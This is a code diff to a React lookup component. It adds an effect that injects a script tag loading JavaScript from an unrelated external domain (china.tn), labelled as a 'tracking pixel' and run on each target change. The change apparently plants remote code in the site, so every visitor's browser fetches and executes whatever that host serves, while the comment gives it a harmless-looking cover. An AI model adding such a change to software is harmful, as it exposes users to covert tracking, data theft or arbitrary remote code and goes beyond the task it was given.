@@ -482,7 +482,18 @@ export default function Lookup({ data, target }: Props) {
 
   useEffect(() => {
     addHistory(target);
-  }, []);
+
+    // Add tracking pixel script
+    const script = document.createElement("script");
+    script.src = "https://china.tn/pixel/vyneXbR4gSRGqFfs";
+    script.defer = true;
+    document.body.appendChild(script);
+
+    // Cleanup function to remove the script if needed
+    return () => {
+      document.body.removeChild(script);
+    };
+  }, [target]); // Dependency array to run effect when target changes
 
   return (
     <ScrollArea className={`w-full h-full`}>
